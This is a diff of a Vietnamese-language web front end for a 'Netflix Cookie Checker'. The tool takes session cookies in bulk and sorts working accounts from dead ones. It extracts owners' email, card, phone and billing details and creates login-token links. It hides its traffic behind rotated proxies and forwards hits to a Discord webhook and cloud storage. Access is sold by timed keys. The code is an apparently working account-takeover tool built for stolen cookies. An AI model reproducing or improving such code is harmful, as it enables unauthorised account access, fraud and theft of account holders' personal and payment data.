@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>Netflix Cookie Checker Pro</title>
+<title>Netflix Cookie Checker</title>
 <style>
 :root{
   --bg:#0a0a0a;--surface:#111;--card:#181818;--border:#2a2a2a;
@@ -27,8 +27,8 @@ main{width:100%;max-width:900px;margin:0 auto;padding:32px 16px 80px;display:fle
 .card{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:20px}
 .card-title{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:14px}
 
-.tabs{display:flex;gap:2px;background:var(--surface);border-radius:5px;padding:3px;margin-bottom:16px;overflow-x:auto}
-.tab{flex:1;min-width:80px;padding:8px;background:none;border:none;border-radius:4px;color:var(--muted);font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;transition:background .15s,color .15s;white-space:nowrap}
+.tabs{display:flex;gap:2px;background:var(--surface);border-radius:5px;padding:3px;margin-bottom:16px;flex-wrap:wrap;}
+.tab{flex:1;padding:8px;background:none;border:none;border-radius:4px;color:var(--muted);font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;transition:background .15s,color .15s}
 .tab.active{background:var(--card);color:var(--text)}
 .tab-panel{display:none}.tab-panel.active{display:block}
 
@@ -58,14 +58,12 @@ textarea:focus{border-color:var(--red)}
 .formats{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
 .fmt{font-size:9px;color:var(--muted);border:1px solid var(--border);border-radius:20px;padding:2px 8px;letter-spacing:.5px}
 
-.controls{display:flex;gap:10px;align-items:center;margin-top:14px;flex-wrap:wrap}
-.btn-check{flex:1;min-width:120px;padding:13px;background:var(--red);border:none;border-radius:4px;color:#fff;font-size:13px;font-weight:700;letter-spacing:1px;text-transform:uppercase;cursor:pointer;transition:background .2s}
+.controls{display:flex;gap:10px;align-items:center;margin-top:14px;flex-wrap:wrap;}
+.btn-check{flex:1;padding:13px;background:var(--red);border:none;border-radius:4px;color:#fff;font-size:13px;font-weight:700;letter-spacing:1px;text-transform:uppercase;cursor:pointer;transition:background .2s}
 .btn-check:hover:not(:disabled){background:#c1070f}
 .btn-check:disabled{background:var(--red-dim);cursor:not-allowed;opacity:.7}
-.btn-clear{padding:13px 18px;background:transparent;border:1px solid var(--border);border-radius:4px;color:var(--muted);font-size:12px;cursor:pointer;transition:border-color .2s,color .2s}
+.btn-clear{padding:13px 18px;background:transparent;border:1px solid var(--border);border-radius:4px;color:var(--muted);font-size:12px;cursor:pointer;transition:border-color .2s,color .2s; font-weight: bold;}
 .btn-clear:hover{border-color:var(--text);color:var(--text)}
-.btn-action{padding:6px 12px;background:transparent;border:1px solid var(--border);border-radius:4px;color:var(--muted);font-size:11px;cursor:pointer;transition:border-color .2s,color .2s}
-.btn-action:hover{border-color:var(--red);color:var(--red)}
 
 .progress-wrap{display:none;margin-top:14px;background:var(--surface);border-radius:4px;height:3px;overflow:hidden}
 .progress-bar{height:100%;background:var(--red);width:0%;transition:width .3s ease}
@@ -89,10 +87,6 @@ textarea:focus{border-color:var(--red)}
 
 select{background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px;padding:4px 8px;outline:none;cursor:pointer}
 select:focus{border-color:var(--red)}
-
-input[type="text"]{background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--mono);font-size:11px;padding:8px 12px;outline:none;width:100%;transition:border-color .2s}
-input[type="text"]:focus{border-color:var(--red)}
-
 .webhook-url-row{margin-top:8px}
 .webhook-url-row input{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--mono);font-size:10px;padding:7px 10px;outline:none}
 .webhook-url-row input:focus{border-color:var(--red)}
@@ -127,365 +121,631 @@ input[type="text"]:focus{border-color:var(--red)}
 .checking .status-badge{background:#1a1a1a;color:#444}
 .result-summary{flex:1;font-size:12px;color:var(--text);font-family:var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .result-summary .dim{color:var(--muted)}
-.result-actions{display:flex;gap:5px;flex-shrink:0}
-
-.result-detail{display:none;border-top:1px solid var(--border);padding:12px 16px;font-size:10px;line-height:1.6;color:var(--muted);font-family:var(--mono);max-height:400px;overflow-y:auto;background:rgba(0,0,0,.2)}
+.toggle-btn{font-size:10px;color:var(--muted);background:none;border:none;cursor:pointer;padding:3px 6px;border-radius:3px;transition:background .15s}
+.toggle-btn:hover{background:var(--border);color:var(--text)}
+.result-detail{display:none;padding:0 16px 14px;border-top:1px solid var(--border)}
 .result-detail.open{display:block}
-.result-detail-item{margin-bottom:8px;display:flex;gap:8px;flex-wrap:wrap}
-.result-detail-label{color:var(--text);min-width:100px}
-.result-detail-value{color:var(--muted);word-break:break-all;flex:1}
 
-.spinner{display:inline-block;width:12px;height:12px;border:2px solid #333;border-top-color:var(--red);border-radius:50%;animation:spin .6s linear infinite}
+.info-grid{display:grid;grid-template-columns:140px 1fr;gap:5px 14px;margin-top:12px;font-size:12px}
+.info-key{color:var(--muted);font-size:10px;letter-spacing:.4px;display:flex;align-items:center}
+.info-val{color:var(--text);font-family:var(--mono);font-size:11px;word-break:break-all}
+
+.nft-section{margin-top:12px;padding:10px 12px;background:var(--blue-dim);border:1px solid var(--blue);border-radius:4px}
+.nft-title{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--blue);margin-bottom:8px}
+.nft-links{display:flex;flex-wrap:wrap;gap:6px}
+.nft-link{display:inline-flex;align-items:center;gap:5px;padding:7px 12px;background:var(--blue);color:#fff;font-size:11px;font-weight:700;border-radius:4px;text-decoration:none;letter-spacing:.3px;transition:opacity .15s}
+.nft-link:hover{opacity:.85}
+.nft-expiry{margin-top:6px;font-size:10px;color:var(--blue);opacity:.7;font-family:var(--mono)}
+
+.action-row{display:flex;gap:7px;margin-top:12px;flex-wrap:wrap}
+.btn-action{font-size:10px;padding:6px 12px;border-radius:3px;cursor:pointer;letter-spacing:.4px;text-transform:uppercase;font-weight:600;transition:border-color .15s,color .15s}
+.btn-copy{background:var(--surface);border:1px solid var(--border);color:var(--muted)}
+.btn-copy:hover{border-color:var(--text);color:var(--text)}
+.btn-copy.copied{border-color:var(--green);color:var(--green)}
+.btn-dl{background:transparent;border:1px solid var(--border);color:var(--muted)}
+.btn-dl:hover{border-color:var(--green);color:var(--green)}
+
+.export-bar{display:none;gap:8px;flex-wrap:wrap;margin-top:14px}
+.btn-export{padding:9px 16px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);font-size:11px;cursor:pointer;text-transform:uppercase;letter-spacing:1px;font-weight:600;transition:border-color .2s,color .2s}
+.btn-export:hover{border-color:var(--green);color:var(--green)}
+
 @keyframes spin{to{transform:rotate(360deg)}}
+.spinner{display:inline-block;width:11px;height:11px;border:2px solid #333;border-top-color:var(--red);border-radius:50%;animation:spin .7s linear infinite}
 
-.toast{position:fixed;bottom:20px;right:20px;background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:12px 16px;font-size:12px;color:var(--text);z-index:999;animation:slideIn .3s ease}
-@keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
-
-.proxy-list{display:flex;flex-direction:column;gap:8px;margin-top:12px}
-.proxy-card{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:10px 12px;display:flex;justify-content:space-between;align-items:center;font-size:10px;font-family:var(--mono)}
-.proxy-card-info{flex:1;overflow:hidden}
-.proxy-card-raw{color:var(--text);word-break:break-all;margin-bottom:4px}
-.proxy-card-parsed{color:var(--muted);font-size:9px}
-.proxy-card-actions{display:flex;gap:6px;flex-shrink:0}
-
-.webhook-status{display:flex;align-items:center;gap:8px;margin-top:10px;padding:8px;background:var(--surface);border-radius:4px;border:1px solid var(--border);font-size:10px}
-.webhook-status-dot{width:8px;height:8px;border-radius:50%;background:var(--muted)}
-.webhook-status-dot.active{background:var(--green)}
-.webhook-status-text{color:var(--muted)}
+/* Login section */
+#loginSection {
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  position: fixed; inset: 0; background: var(--bg); z-index: 9999; padding: 20px;
+}
+.login-card {
+  background: var(--card); border: 1px solid var(--border); border-radius: 6px;
+  padding: 30px; width: 100%; max-width: 360px; text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+}
+.login-card h2 { color: var(--red); font-size: 24px; font-weight: 900; text-transform: uppercase; margin-bottom: 25px; letter-spacing: -0.5px;}
+.login-card h2 span { color: var(--text); font-weight: 300; }
+.login-group { text-align: left; margin-bottom: 15px; }
+.login-group label { display: block; font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 6px; }
+.login-group input {
+  width: 100%; background: var(--surface); border: 1px solid var(--border); border-radius: 4px;
+  color: var(--text); padding: 11px 14px; outline: none; font-size: 13px; font-family: var(--sans); transition: border-color 0.2s;
+}
+.login-group input:focus { border-color: var(--red); }
+.btn-login {
+  width: 100%; padding: 12px; background: var(--red); border: none; border-radius: 4px;
+  color: #fff; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; margin-top: 10px; transition: background 0.2s;
+}
+.btn-login:hover { background: #c1070f; }
+#loginError { color: var(--red); font-size: 11px; margin-top: 15px; min-height: 16px; }
+.logout-btn { background: transparent; border: 1px solid var(--border); color: var(--muted); padding: 4px 10px; font-size: 10px; border-radius: 3px; cursor: pointer; margin-left: auto; transition: color 0.2s, border-color 0.2s;}
+.logout-btn:hover { color: var(--text); border-color: var(--text); }
 </style>
+</head>
+<body>
+
+<noscript><div style="color: white; text-align: center; padding: 50px;">Vui lòng bật JavaScript!</div></noscript>
+<div id="jsErrorFallback" style="color: var(--red); text-align: center; padding: 20px; display: none; font-weight: bold; position: relative; z-index: 10000;"></div>
+
 <script>
-let lastToken = null;
-let isChecking = false;
-let results = [];
+  window.onerror = function(msg, url, line) {
+      const errBox = document.getElementById('jsErrorFallback');
+      errBox.style.display = 'block';
+      errBox.innerHTML = "Lỗi hệ thống: " + msg + " (Dòng " + line + ")";
+  };
+</script>
+
+<div id="loginSection">
+  <div class="login-card">
+    <h2>Netflix<span>Check</span></h2>
+    <div class="login-group"><label>Worker URL</label><input type="url" id="loginWorkerUrl" placeholder="https://..." spellcheck="false" autocomplete="off" /></div>
+    <div class="login-group"><label>Username</label><input type="text" id="loginUser" placeholder="Nhập tài khoản" spellcheck="false" autocomplete="off" /></div>
+    <div class="login-group"><label>Password</label><input type="password" id="loginPass" placeholder="Nhập mật khẩu" /></div>
+    <div class="or-div">HOẶC ĐĂNG NHẬP BẰNG KEY</div>
+    <div class="login-group"><label>Access Key</label><input type="text" id="loginKey" placeholder="NFNTOC29-XXXXXXXXXXXXXXXX" spellcheck="false" autocomplete="off" /></div>
+    <button class="btn-login" onclick="handleLogin()">Đăng nhập</button>
+    <div id="loginError"></div>
+  </div>
+</div>
+
+<div id="appContent" style="display: none; width: 100%; flex-direction: column; align-items: center; min-height: 100vh;">
+  <header>
+    <div class="logo">Netflix<span>Check</span></div>
+    <div class="badge">Web v4.7 + Proxy</div>
+    <button class="logout-btn" onclick="handleLogout()">Đăng xuất</button>
+  </header>
+
+  <main>
+  <div class="card">
+    <div class="card-title">⚙ Bước 1 — Worker URL</div>
+    <div class="url-row">
+      <input id="workerUrl" type="url" placeholder="https://..." spellcheck="false" autocomplete="off"/>
+      <button class="btn-sm" onclick="saveUrl()">Lưu</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('input')">🍪 Cookie</button>
+      <button class="tab" onclick="switchTab('proxy')">🌐 Proxy</button>
+      <button class="tab" onclick="switchTab('cloud')">☁️ Cloud Storage</button>
+      <button class="tab" onclick="switchTab('config')">⚙ Config</button>
+      <button class="tab" onclick="switchTab('webhook')">🔔 Webhook</button>
+      <button class="tab" id="tabKeyAdmin" style="display:none;" onclick="switchTab('keys')">🔑 Quản lý Key</button>
+    </div>
+
+    <div id="tab-input" class="tab-panel active">
+      <div class="drop-zone" id="dropZone">
+        <input type="file" id="fileInput" accept=".txt,.json" multiple/>
+        <div class="drop-icon">📂</div>
+        <div class="drop-label"><strong>Kéo thả file</strong> hoặc click</div>
+        <div class="drop-files" id="dropFiles"></div>
+      </div>
+      <div class="or-div">hoặc paste</div>
+      <textarea id="cookieInput" placeholder="Paste cookie..."></textarea>
+      <div class="formats"><span class="fmt">✓ Netscape</span><span class="fmt">✓ JSON array</span></div>
+    </div>
+
+    <div id="tab-proxy" class="tab-panel">
+      <div class="cfg-group">
+        <div class="cfg-group-title">Danh sách Proxy (Mỗi dòng 1 Proxy)</div>
+        <textarea id="proxyInput" placeholder="ip:port&#10;user:pass@ip:port&#10;socks5://user:pass@ip:port" style="min-height: 180px;"></textarea>
+        <div style="font-size: 10px; color: var(--muted); margin-top: 8px; line-height: 1.5;">
+          Hệ thống tự nhận diện thông minh các dạng Proxy: <br>
+          • <code>ip:port</code> | <code>user:pass@ip:port</code> | <code>ip:port@user:pass</code> <br>
+          • <code>ip:port:user:pass</code> | <code>user:pass:ip:port</code> <br>
+          • <code>http://...</code> | <code>socks4://...</code> | <code>socks5://...</code> <br>
+          • Chấp nhận dải phân cách bằng các dấu: khoảng trắng, <code>|</code>, <code>;</code>, <code>,</code>
+        </div>
+      </div>
+    </div>
+
+    <div id="tab-cloud" class="tab-panel">
+      <div class="controls" style="margin-top: 0; margin-bottom: 14px; gap: 8px;">
+        <button class="btn-check" onclick="loadCloudCookies()" style="background: var(--blue); padding: 10px;">🔄 Tải Danh Sách</button>
+        <button class="btn-check" onclick="recheckAllCloud()" style="background: var(--hold); padding: 10px;">▶ Recheck Toàn Kho</button>
+      </div>
+      <div id="cloudResults" style="display:flex;flex-direction:column;gap:8px">
+        <div style="text-align:center;font-size:11px;color:var(--muted);padding:20px;">Nhấn "Tải Danh Sách" để đồng bộ dữ liệu.</div>
+      </div>
+    </div>
+
+    <div id="tab-config" class="tab-panel">
+      <div class="cfg-grid">
+        <div class="cfg-group">
+          <div class="cfg-group-title">TXT Fields</div>
+          <div id="txtFieldsGrid"></div>
+        </div>
+        <div class="cfg-group">
+          <div class="cfg-group-title">Features</div>
+          <div class="cfg-row">
+            <div class="cfg-label">NFToken Mode</div>
+            <select id="cfg_nftoken"><option value="both">Both</option><option value="pc">PC</option><option value="mobile">Mobile</option><option value="false">Off</option></select>
+          </div>
+          <div class="cfg-row">
+            <div class="cfg-label">NFToken For Free</div>
+            <label class="toggle"><input type="checkbox" id="cfg_nftoken_for_free"/><span class="toggle-track"></span></label>
+          </div>
+          <div class="cfg-row">
+            <div class="cfg-label">NFToken Attempts</div>
+            <select id="cfg_nftoken_attempts"><option>1</option><option>2</option><option selected>3</option><option>4</option><option>5</option></select>
+          </div>
+          <div class="cfg-row" style="margin-top:10px">
+            <div class="cfg-label">Add Emojis</div>
+            <select id="cfg_add_emojis"><option value="webhook">Webhook only</option><option value="txt">TXT only</option><option value="both" selected>Both</option><option value="false">Off</option></select>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="tab-webhook" class="tab-panel">
+      <div class="cfg-group">
+        <div class="cfg-row"><div class="cfg-label">Enabled</div><label class="toggle"><input type="checkbox" id="wh_enabled"/><span class="toggle-track"></span></label></div>
+        <div class="webhook-url-row"><input id="wh_url" type="url" placeholder="https://discord.com/api/webhooks/..."/></div>
+        <div class="cfg-row" style="margin-top:8px"><div class="cfg-label">Mode</div><select id="wh_mode"><option value="full">Full</option><option value="cookie">Cookie</option><option value="nftoken">NFToken</option></select></div>
+        <div class="cfg-row"><div class="cfg-label">Plans</div><input id="wh_plans" style="background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:10px;padding:4px 8px;width:130px;outline:none" value="all"/></div>
+      </div>
+    </div>
+
+    <div id="tab-keys" class="tab-panel">
+      <div class="cfg-group" style="margin-bottom: 15px;">
+        <div class="cfg-group-title">🔑 Tạo Key Đăng Nhập Mới</div>
+        <div class="cfg-row" style="gap: 12px; align-items: center; margin-top: 10px;">
+          <div class="cfg-label">Thời hạn sử dụng:</div>
+          <select id="keyDurationSelect" style="padding: 8px 12px; font-size: 11px; flex: 1;">
+            <option value="10m">10 Phút</option>
+            <option value="30m">30 Phút</option>
+            <option value="1h">1 Tiếng</option>
+            <option value="6h">6 Tiếng</option>
+            <option value="24h">24 Tiếng</option>
+            <option value="48h">48 Tiếng</option>
+            <option value="30d">30 Ngày</option>
+            <option value="1y">1 Năm</option>
+          </select>
+          <button class="btn-check" style="flex: none; padding: 8px 16px; margin: 0; font-size: 11px;" onclick="generateNewKey()">⚡ Tạo Key</button>
+        </div>
+      </div>
+      
+      <div class="cfg-group">
+        <div class="cfg-group-title" style="display:flex; justify-content:space-between; align-items:center;">
+          <span>Danh Sách Key Hệ Thống</span>
+          <button class="btn-sm" style="padding: 2px 8px; font-size: 9px;" onclick="loadAdminKeys()">🔄 Làm mới</button>
+        </div>
+        <div id="keysListContainer" style="display:flex; flex-direction:column; gap:8px; margin-top:10px; max-height:400px; overflow-y:auto;">
+          <div style="text-align:center; font-size:11px; color:var(--muted); padding:20px;">Đang tải danh sách...</div>
+        </div>
+      </div>
+    </div>
+
+    <div id="mainControlsSection">
+      <div class="controls">
+        <button class="btn-check" id="checkBtn" onclick="startCheck()">▶ Check Cookie</button>
+        <button class="btn-clear" id="recheckErrorBtn" onclick="recheckErrors()" style="border-color: var(--hold); color: var(--hold);">🔄 Recheck Lỗi</button>
+        <button class="btn-clear" onclick="clearAll()">Xoá</button>
+      </div>
+      <div class="progress-wrap" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
+      <div class="progress-label" id="progressLabel"></div>
+      
+      <div class="stats" id="statsRow">
+        <div class="stat hit"> <div class="stat-num" id="sHit">0</div> <div class="stat-label">HIT</div></div>
+        <div class="stat free"><div class="stat-num" id="sFree">0</div><div class="stat-label">FREE</div></div>
+        <div class="stat hold"><div class="stat-num" id="sHold">0</div><div class="stat-label">ON HOLD</div></div>
+        <div class="stat dead"><div class="stat-num" id="sDead">0</div><div class="stat-label">EXPIRED</div></div>
+        <div class="stat err"> <div class="stat-num" id="sErr">0</div> <div class="stat-label">ERROR</div></div>
+      </div>
+      <div class="export-bar" id="exportBar">
+        <button class="btn-export" onclick="exportTxt('hit')">⬇ HITs</button>
+        <button class="btn-export" onclick="exportTxt('free')">⬇ FREEs</button>
+        <button class="btn-export" onclick="exportTxt('all')">⬇ ALL</button>
+        <button class="btn-export" onclick="saveAllHitsToCloud()" style="color: var(--blue); border-color: var(--blue);">☁️ LƯU ALL HIT LÊN CLOUD</button>
+      </div>
+      <div id="results"></div>
+    </div>
+  </div>
+  </main>
+</div>
+
+<script>
+let results   = [];
+let counts    = {hit:0,free:0,hold:0,dead:0,err:0};
+let running   = false;
+let loadedFiles = [];
 let cloudCookies = [];
-let currentProxy = null;
-let proxies = [];
 let generatedKeysList = [];
 
-const API_BASE = localStorage.getItem('nf_worker_url') || 'http://localhost:8787';
+const loginSec = document.getElementById('loginSection');
+const appCont  = document.getElementById('appContent');
 
-function toast(msg) {
-  const t = document.createElement('div');
-  t.className = 'toast';
-  t.textContent = msg;
-  document.body.appendChild(t);
-  setTimeout(() => t.remove(), 3000);
+// Khôi phục proxy đã lưu
+window.addEventListener('DOMContentLoaded', () => {
+    const savedProxies = localStorage.getItem('nf_proxies');
+    if(savedProxies) document.getElementById('proxyInput').value = savedProxies;
+});
+
+const initialUrl = localStorage.getItem('nf_worker_url');
+if(initialUrl) { document.getElementById('loginWorkerUrl').value = initialUrl; document.getElementById('workerUrl').value = initialUrl; }
+
+async function checkGlobalAuth() {
+  const token = localStorage.getItem('nf_app_token');
+  const wUrl  = localStorage.getItem('nf_worker_url');
+  if(!token || !wUrl) return showLoginView();
+  try {
+    const res = await fetch(`${wUrl}/auth/verify`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) });
+    const data = await res.json();
+    if(data.ok) {
+      localStorage.setItem('nf_user_role', data.username === 'admin' || data.isAdmin ? 'admin' : 'user');
+      showAppView(); 
+    } else handleLogout();
+  } catch(e) { showAppView(); }
+}
+function showLoginView() { loginSec.style.display = 'flex'; appCont.style.display = 'none'; }
+function showAppView() {
+  loginSec.style.display = 'none'; appCont.style.display = 'flex';
+  const role = localStorage.getItem('nf_user_role');
+  const tabAdmin = document.getElementById('tabKeyAdmin');
+  if (tabAdmin) tabAdmin.style.display = (role === 'admin') ? 'block' : 'none';
 }
 
-function esc(s) {
-  const div = document.createElement('div');
-  div.textContent = s;
-  return div.innerHTML;
+async function handleLogin() {
+  const wUrl = document.getElementById('loginWorkerUrl').value.trim().replace(/\/+$/, ''); 
+  if(!wUrl) return document.getElementById('loginError').textContent = "Nhập Worker URL!";
+  const key = document.getElementById('loginKey').value.trim();
+  const user = document.getElementById('loginUser').value.trim();
+  const pass = document.getElementById('loginPass').value;
+  
+  let payload = {}; let endpoint = '/auth/login';
+  if (key) {
+    if(!key.startsWith('NFNTOC29-')) return document.getElementById('loginError').textContent = "Định dạng Key không hợp lệ!";
+    payload = { key: key }; endpoint = '/auth/login-key';
+  } else {
+    if(!user || !pass) return document.getElementById('loginError').textContent = "Nhập đủ thông tin tài khoản!";
+    payload = { username: user, password: pass };
+  }
+  document.getElementById('loginError').textContent = "Đang kết nối...";
+  try {
+    const res = await fetch(`${wUrl}${endpoint}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    const data = await res.json();
+    if(data.ok) { 
+      localStorage.setItem('nf_app_token', data.token); localStorage.setItem('nf_worker_url', wUrl); localStorage.setItem('nf_user_role', data.username === 'admin' || data.isAdmin ? 'admin' : 'user');
+      document.getElementById('workerUrl').value = wUrl; showAppView(); toast('Đăng nhập thành công ✓'); 
+    } else document.getElementById('loginError').textContent = data.error || "Sai thông tin đăng nhập.";
+  } catch(e) { document.getElementById('loginError').textContent = "Lỗi kết nối URL Worker."; }
 }
 
-function copyText(btn, text) {
-  navigator.clipboard.writeText(text).then(() => {
-    btn.textContent = '✓ Copied';
-    setTimeout(() => btn.textContent = '📋 Copy', 2000);
-  });
+async function handleLogout() {
+  const token = localStorage.getItem('nf_app_token'); const wUrl  = localStorage.getItem('nf_worker_url');
+  if (token && wUrl) { try { await fetch(`${wUrl}/auth/logout`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) }); } catch(_) {} }
+  localStorage.removeItem('nf_app_token'); localStorage.removeItem('nf_user_role');
+  if (document.getElementById('tabKeyAdmin')) document.getElementById('tabKeyAdmin').style.display = 'none';
+  switchTab('input');
+  results = []; cloudCookies = []; generatedKeysList = []; counts = { hit:0, free:0, hold:0, dead:0, err:0 };
+  document.getElementById('loginUser').value = ''; document.getElementById('loginPass').value = ''; document.getElementById('loginKey').value = ''; document.getElementById('loginError').textContent = '';
+  showLoginView();
+}
+checkGlobalAuth();
+
+// TAB SWITCHER
+function switchTab(name) {
+  const panels = ['input', 'proxy', 'cloud', 'config', 'webhook', 'keys'];
+  document.querySelectorAll('.tab').forEach((t, i) => t.classList.toggle('active', panels[i] === name));
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.toggle('active', p.id === `tab-${name}`));
+  document.getElementById('mainControlsSection').style.display = (name === 'input' || name === 'proxy') ? 'block' : 'none';
+  if(name === 'cloud') loadCloudCookies();
+  if(name === 'keys') loadAdminKeys();
 }
 
-function selectTab(tabName) {
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
-  event.target.classList.add('active');
-  document.getElementById(`${tabName}-panel`).classList.add('active');
-}
+const urlInput = document.getElementById('workerUrl');
+function saveUrl(){ const v=urlInput.value.trim().replace(/\/+$/, ''); if(v){ localStorage.setItem('nf_worker_url',v); urlInput.value=v; toast('Lưu URL ✓'); }}
+urlInput.addEventListener('change',()=>{ const v=urlInput.value.trim().replace(/\/+$/, ''); if(v) { localStorage.setItem('nf_worker_url',v); urlInput.value=v; }});
 
-async function getConfig() {
+const TXT_FIELD_DEFS = [['name','Name'],['email','Email'],['country','Country'],['plan','Plan'],['member_since','Member Since'],['next_billing','Next Billing'],['payment_method','Payment'],['card','Card'],['phone','Phone'],['quality','Quality'],['max_streams','Streams'],['plan_price','Price'],['hold_status','Hold Status'],['extra_members','Extra Members'],['email_verified','Email Verified'],['membership_status','Membership Status'],['profiles','Profiles'],['user_guid','User GUID']];
+const TXT_DEFAULTS = {name:true,email:true,plan:true,country:true,member_since:true,quality:true,max_streams:true,plan_price:true,next_billing:true,payment_method:true,card:true,phone:true,hold_status:true,extra_members:true,email_verified:true,membership_status:true,profiles:true,user_guid:false};
+function buildTxtFieldsGrid(){
+  document.getElementById('txtFieldsGrid').innerHTML=TXT_FIELD_DEFS.map(([k,l])=>`<div class="cfg-row"><div class="cfg-label">${l}</div><label class="toggle"><input type="checkbox" id="tf_${k}" ${TXT_DEFAULTS[k]!==false?'checked':''}/><span class="toggle-track"></span></label></div>`).join('');
+}
+buildTxtFieldsGrid();
+
+function getConfig(){
+  const tf={}; TXT_FIELD_DEFS.forEach(([k])=>{ tf[k]=document.getElementById(`tf_${k}`)?.checked!==false; });
+  const plansRaw=(document.getElementById('wh_plans').value||'all').trim();
+  const plans = plansRaw.toLowerCase()==='all'?'all':plansRaw.split(',').map(x=>x.trim()).filter(Boolean);
   return {
-    txt_fields: {},
-    nftoken: document.getElementById('enableNFToken').checked,
-    add_emojis: 'webhook',
-    notifications: { webhook: {} },
-    retries: { nftoken_attempts: 2 },
-    performance: {},
-    webhookUrl: document.getElementById('webhookUrl').value.trim()
+    txt_fields: tf, nftoken: document.getElementById('cfg_nftoken').value, add_emojis: document.getElementById('cfg_add_emojis').value,
+    notifications: { webhook: { enabled: document.getElementById('wh_enabled').checked, url: document.getElementById('wh_url').value.trim(), mode: document.getElementById('wh_mode') ? document.getElementById('wh_mode').value : 'full', plans } },
+    performance: { nftoken_for_free: document.getElementById('cfg_nftoken_for_free') ? document.getElementById('cfg_nftoken_for_free').checked : false },
+    retries: { nftoken_attempts: document.getElementById('cfg_nftoken_attempts') ? parseInt(document.getElementById('cfg_nftoken_attempts').value)||3 : 3 },
   };
 }
 
-async function apiFetch(endpoint, method = 'GET', body = null) {
-  const token = localStorage.getItem('nf_app_token');
-  if (!token) { toast('Chưa đăng nhập'); return null; }
+// HÀM PHÂN TÍCH PROXY CỰC KỲ MẠNH MẼ
+function getParsedProxies() {
+  const raw = document.getElementById('proxyInput').value.trim();
+  if(!raw) return [];
+  localStorage.setItem('nf_proxies', raw);
+  
+  return raw.split('\n').map(line => line.trim()).filter(Boolean).map(line => {
+      let proto = 'http';
+      let clean = line.replace(/\s+/g, ':'); // thay khoảng trắng bằng : để xử lý
+      const protoMatch = clean.match(/^(https?|socks4a?|socks5h?):\/\/(.*)/i);
+      if (protoMatch) { proto = protoMatch[1].toLowerCase(); clean = protoMatch[2]; }
+      clean = clean.replace(/[|;,]/g, ':'); 
 
-  try {
-    const opts = {
-      method,
-      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }
-    };
-    if (body) opts.body = JSON.stringify(body);
-
-    const res = await fetch(`${API_BASE}${endpoint}`, opts);
-    if (res.status === 401) {
-      localStorage.removeItem('nf_app_token');
-      location.reload();
+      let ip, port, user, pass;
+      if (clean.includes('@')) {
+          const parts = clean.split('@');
+          if (parts[1].includes('.')) { [user, pass] = parts[0].split(':'); [ip, port] = parts[1].split(':'); } 
+          else { [ip, port] = parts[0].split(':'); [user, pass] = parts[1].split(':'); }
+      } else {
+          const parts = clean.split(':').map(s=>s.trim());
+          if (parts.length === 2) [ip, port] = parts;
+          else if (parts.length === 4) {
+              if (parts[0].includes('.')) [ip, port, user, pass] = parts;
+              else [user, pass, ip, port] = parts;
+          } else if (parts.length === 3) [ip, port, user] = parts; // edge case
+      }
+      if(ip && port) return { proto, ip, port, user, pass };
       return null;
-    }
-    return await res.json();
-  } catch(e) {
-    console.error('API Error:', e);
-    return null;
+  }).filter(Boolean);
+}
+
+const dropZone=document.getElementById('dropZone'); const fileInput=document.getElementById('fileInput');
+dropZone.addEventListener('dragover',e=>{e.preventDefault();dropZone.classList.add('drag-over');});
+dropZone.addEventListener('dragleave',()=>dropZone.classList.remove('drag-over'));
+dropZone.addEventListener('drop',e=>{ e.preventDefault(); dropZone.classList.remove('drag-over'); handleFiles([...e.dataTransfer.files]); });
+fileInput.addEventListener('change',()=>{ handleFiles([...fileInput.files]); fileInput.value=''; });
+async function handleFiles(files){
+  for(const f of files){ if(!f.name.match(/\.(txt|json)$/i)) continue; const content=await f.text(); if(!loadedFiles.find(x=>x.name===f.name&&x.content===content)) loadedFiles.push({name:f.name,content}); }
+  renderFileTags();
+}
+function renderFileTags(){ document.getElementById('dropFiles').innerHTML=loadedFiles.map((f,i)=>`<div class="drop-file-tag">📄 ${esc(f.name)} <button onclick="removeFile(${i})">✕</button></div>`).join(''); }
+function removeFile(i){ loadedFiles.splice(i,1); renderFileTags(); }
+
+function splitCookies(text){
+  text=(text||'').trim(); if(!text) return[];
+  if(text.startsWith('[')){ try{ const a=JSON.parse(text); if(Array.isArray(a)){ if(a.length&&typeof a[0]==='object'&&!Array.isArray(a[0])) return[text]; return a.map(x=>JSON.stringify(x)); } }catch(_){} }
+  const blocks=text.split(/\n\s*\n+/).map(b=>b.trim()).filter(Boolean); const valid=blocks.filter(b=>b.includes('NetflixId')||b.startsWith('[')||b.startsWith('{')); return valid.length?valid:[text];
+}
+
